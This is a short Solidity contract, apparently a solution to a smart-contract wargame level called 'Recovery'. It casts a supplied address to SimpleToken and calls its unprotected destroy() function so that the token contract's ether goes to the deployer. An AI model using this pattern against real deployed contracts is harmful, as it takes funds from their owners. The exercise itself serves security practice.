// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./recovery.sol";

contract recoveryAttack {
    address payable receiver = payable(msg.sender);
    SimpleToken public killMeplease;
    
    function destroySimpleToken(address payable simpleTokenAddress) public{
        killMeplease = SimpleToken(simpleTokenAddress);
        killMeplease.destroy(receiver);
    }
}